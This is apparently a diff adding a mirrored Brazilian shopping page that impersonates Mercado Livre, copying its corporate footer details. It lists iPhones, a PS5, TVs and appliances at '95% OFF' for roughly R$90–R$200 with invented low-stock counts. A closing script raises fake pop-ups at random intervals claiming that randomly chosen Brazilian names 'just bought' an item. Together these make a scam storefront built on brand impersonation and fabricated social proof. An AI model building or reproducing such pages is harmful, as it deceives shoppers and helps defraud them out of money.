+          <img src="https://i.postimg.cc/NFDhBHw2/c1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 469,00</div>
+          <span class="new-price">R$ 87,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
+          <p class="product-name">Cafeteira Portátil Nescafé Dolce <span style="font-family: 'GellixBold';"></span>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/escorredor' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/c151R3MZ/escorredor.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 695,00</div>
+          <span class="new-price">R$ 97,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 20 unidades</span>
+          <p class="product-name">Escorredor Pro Five De Prato Louça <span style="font-family: 'GellixBold';">Inox </span>
+          </p>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/iph09' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_pro_titanio.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 6.999,00</div>
+          <span class="new-price">R$ 117,58</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 4 unidades</span>
+          <p class="product-name">iPhone 15 Pro (256GB) <span style="font-family: 'GellixBold';">Titânio</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/tv' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/66GcHmpj/tv1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 2.999,99</div>
+          <span class="new-price">R$ 127,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 12 unidades</span>
+          <p class="product-name">Samsung Smart Tv 55 Polegadas <span style="font-family: 'GellixBold';">Qled 4k 2024</span>
+          </p>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/panela' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/sXj6gvv0/p1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.099,99</div>
+          <span class="new-price">R$ 119,48</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 14 unidades</span>
+          <p class="product-name">Jogo De Panelas Vanilla 10pçs Indução <span style="font-family: 'GellixBold';">Antiaderente Brinox</span>
+          </p>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/ps5' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/cLsBY6RR/s1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 6.499,99</div>
+          <span class="new-price">R$ 197,13</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 07 unidades</span>
+          <p class="product-name">Playstation Ps5 PRO <span style="font-family: 'GellixBold';">Branco 2 TB</span>
+          </p>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/microo' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/m28sfXS7/m1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.757,99</div>
+          <span class="new-price">R$ 106,16</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 04 unidades</span>
+          <p class="product-name">Microondas Brastemp 38L <span style="font-family: 'GellixBold';">Inox</span>
+          </p>
+        </div>
+      </div>
+
+       <!--------------------- Máquina de lavar --------------------->
+
+
+        <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/lavar/' + window.location.search;">
+            <div class="product-image">
+                <img src="https://i.postimg.cc/QCKggqbf/lavar1.jpg" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 3999,99</div>
+
+                <span class="new-price">R$ 116,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 81%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 12px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 8 unidades</p>
+                </div>
+
+                <p class="product-name">Lava E Seca Samsung Inox 11kg</p>
+            </div>
+        </div>
+
+        
+
+
+        <!--------------------- Ar condicionado --------------------->
+
+
+        <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/ar/' + window.location.search;">
+            <div class="product-image">
+                <img src="https://i.postimg.cc/3wZtW9Sp/ar1.webp" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 1499,90</div>
+
+                <span class="new-price">R$ 114,19</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 81%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 12px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 9 unidades</p>
+                </div>
+
+                <p class="product-name">Ar Condicionado Split LG 24000 B</p>
+            </div>
+        </div>
+
+                <!--------------------- Fogão --------------------->
+
+
+        <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/fogao/' + window.location.search;">
+            <div class="product-image">
+                <img src="https://i.postimg.cc/bYCZFhwk/f1.jpg" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 2099,90</div>
+
+                <span class="new-price">R$ 99,99</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 81%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 12px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 7 unidades</p>
+                </div>
+
+                <p class="product-name">Fogão 5 Bocas Atlas Com Mesa De Vidro 127V/220V</p>
+            </div>
+        </div>
+
+
+      <div class="bracelet-item">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/poco_antigo.webp" style="height: 115px; width: auto; margin-top: 20px;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
+            <div class="free-shipping-container">
+              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
+                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
+                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">ESGOTADO</span>
+              </span>
+            </div>
+          </div>
+          <p class="product-name">JBL GO 4 <span style="font-family: 'GellixBold';">Preta</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_azul.jpg" style="height: 115px; width: auto; margin-top: 20px;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
+            <div class="free-shipping-container">
+              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
+                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
+                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">ESGOTADO</span>
+              </span>
+            </div>
+          </div>
+          <p class="product-name">Apple iPhone 15 Pro Max (256 GB) <span style="font-family: 'GellixBold';">Azul</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_verde.jpg" style="height: 115px; width: auto; margin-top: 20px;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
+            <div class="free-shipping-container">
+              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
+                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
+                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">ESGOTADO</span>
+              </span>
+            </div>
+          </div>
+          <p class="product-name">Apple iPhone 15 Pro Max (256 GB) <span style="font-family: 'GellixBold';">Verde</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_pro_max_titanio_azul.jpg" style="height: 115px; width: auto; margin-top: 20px;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
+            <div class="free-shipping-container">
+              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
+                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
+                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">ESGOTADO</span>
+              </span>
+            </div>
+          </div>
+          <p class="product-name">Apple iPhone 15 Pro Max (256 GB) <span style="font-family: 'GellixBold';">Titânio Azul</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/ipad_10.jpg" style="height: 115px; width: auto; margin-top: 20px;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
+            <div class="free-shipping-container">
+              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
+                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
+                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">ESGOTADO</span>
+              </span>
+            </div>
+          </div>
+          <p class="product-name">Apple iPhone 15 Pro Max (256 GB) <span>Titânio Azul</span>
+          </p>
+        </div>
+      </div>
+    </div>
+    <div class="divisoria2"></div>
+    <p style="margin-left: 3%; margin-right: 3%; font-family: 'GellixRegular'; font-size: 14px; padding-top: 5px;">
+      <span style="font-family: 'GellixSemiBold';">Termos e condições. Como cuidamos da sua privacidade. Acessibilidade Informações sobre seguros Blog Afiliados Tendências</span>
+      <br>
+      <br>© 1999-2024 Ebazar.com.br LTDA. CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre. <span style="font-family: 'GellixSemiBold';">
+        <br>
+        <br>Brasil/Português </span>
+    </p>
+
+
+<script src="js/notiflix-aio-2.6.0.min.js"></script>
+
+       <script> /right-top, right-bottom, left-top, left-bottom, center-top, center-bottom, center-center/
+        var position = "left-bottom";
+ 
+        /verde, azul, vermelho, amarelo/
+        var color = "verde";
+ 
+        /fade, zoom, from-right, from-left, from-top, from-bottom/
+        var animation = "from-left";
+ 
+        /nome do produto/
+        var product_name = "";
+ 
+        /frase depois do nome da pessoa/
+        var phrase = "acabou de comprar com 95% de desconto";
+        var timeout = 5000;
+ 
+        /masc, fem, any/
+        var type_name = "masc, fem";
+        var msg_final = "";
+ 
+        var min_time = 5;
+        var max_time = 10;
+ 
+        var names_masc = ['Jose', 'Joao', 'Antonio', 'Francisco', 'Carlos', 'Paulo', 'Pedro', 'Lucas', 'Luiz', 'Marcos', 'Luis', 'Gabriel', 'Rafael', 'Daniel', 'Marcelo', 'Bruno', 'Eduardo', 'Felipe', 'Rodrigo', 'Manoel', 'Mateus', 'Andre', 'Fernando', 'Fabio', 'Leonardo', 'Gustavo', 'Guilherme', 'Leandro', 'Tiago', 'Anderson', 'Ricardo', 'Marcio', 'Jorge', 'Alexandre', 'Roberto', 'Edson', 'Diego', 'Vitor', 'Sergio', 'Claudio', 'Matheus', 'Thiago', 'Geraldo', 'Adriano', 'Luciano', 'Julio', 'Renato', 'Alex', 'Vinicius', 'Rogerio', 'Samuel', 'Ronaldo', 'Mario', 'Flavio', 'Douglas', 'Igor', 'Davi', 'Manuel', 'Jeferson', 'Cicero', 'Victor', 'Miguel', 'Robson', 'Mauricio', 'Danilo', 'Henrique', 'Caio', 'Reginaldo', 'Joaquim', 'Benedito', 'Gilberto', 'Marco', 'Alan', 'Nelson', 'Cristiano', 'Elias', 'Wilson', 'Valdir', 'Emerson', 'Luan', 'David', 'Renan', 'Severino', 'Fabricio', 'Mauro', 'Jonas', 'Gilmar', 'Jean', 'Fabiano', 'Wesley', 'Diogo', 'Adilson', 'Jair', 'Alessandro', 'Everton', 'Osvaldo', 'Gilson', 'Willian', 'Joel', 'Silvio', 'Helio', 'Maicon', 'Reinaldo', 'Pablo', 'Artur', 'Vagner', 'Valter', 'Celso', 'Ivan', 'Cleiton', 'Vanderlei', 'Vicente', 'Arthur', 'Milton', 'Domingos', 'Wagner', 'Sandro', 'Moises', 'Edilson', 'Ademir', 'Adao', 'Evandro', 'Cesar', 'Valmir', 'Murilo', 'Juliano', 'Edvaldo', 'Ailton', 'Junior', 'Breno', 'Nicolas', 'Ruan', 'Alberto', 'Rubens', 'Nilton', 'Augusto', 'Cleber', 'Osmar', 'Nilson', 'Hugo', 'Otavio', 'Vinicios', 'Italo', 'Wilian', 'Alisson', 'Aparecido'];
+        var names_fem = ['Maria', 'Ana', 'Francisca', 'Antonia', 'Adriana', 'Juliana', 'Marcia', 'Fernanda', 'Patricia', 'Aline', 'Sandra', 'Camila', 'Amanda', 'Bruna', 'Jessica', 'Leticia', 'Julia', 'Luciana', 'Vanessa', 'Mariana', 'Gabriela', 'Vera', 'Vitoria', 'Larissa', 'Claudia', 'Beatriz', 'Rita', 'Luana', 'Sonia', 'Renata', 'Eliane'];
+ 
+        var option = {
+            position: position,
+            cssAnimationStyle: animation,
+            plainText: false,
+            timeout: timeout
+        };
+ 
+        function show_notification() {
+            if (type_name == "masc") {
+                msg_final = "<strong>" + names_masc[Math.floor(Math.random() * names_masc.length)] + "</strong>";
+            } else if (type_name == "fem") {
+                msg_final = "<strong>" + names_fem[Math.floor(Math.random() * names_fem.length)] + "</strong>";
+            } else {
+                var array_aux = ["masc", "fem"];
+ 
+                if (array_aux[Math.floor(Math.random() * array_aux.length)] == "masc") {
+                    msg_final = "<strong>" + names_masc[Math.floor(Math.random() * names_masc.length)] + "</strong>";
+                } else {
+                    msg_final = "<strong>" + names_fem[Math.floor(Math.random() * names_fem.length)] + "</strong>";
+                }
+            }
+ 
+            msg_final += decodeURIComponent(escape(" " + phrase + " " + product_name));
+ 
+            if (color == "verde") {
+                Notiflix.Notify.Success(msg_final, option);
+            }
+ 
+            if (color == "azul") {
+                Notiflix.Notify.Info(msg_final, option);
+            }
+ 
+            if (color == "vermelho") {
+                Notiflix.Notify.Failure(msg_final, option);
+            }
+ 
+            if (color == "amarelo") {
+                Notiflix.Notify.Success(msg_final, option);
+            }
+ 
+            var rand = Math.floor(Math.random() * (max_time - min_time + 1) + min_time);
+            setTimeout(show_notification, rand * 1000);
+        }
+            setTimeout(show_notification, 7 * 1000);
+</script></body><!-- Mirrored from exclusivalojas.com/loja/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 15 Oct 2024 14:43:04 GMT --></html>
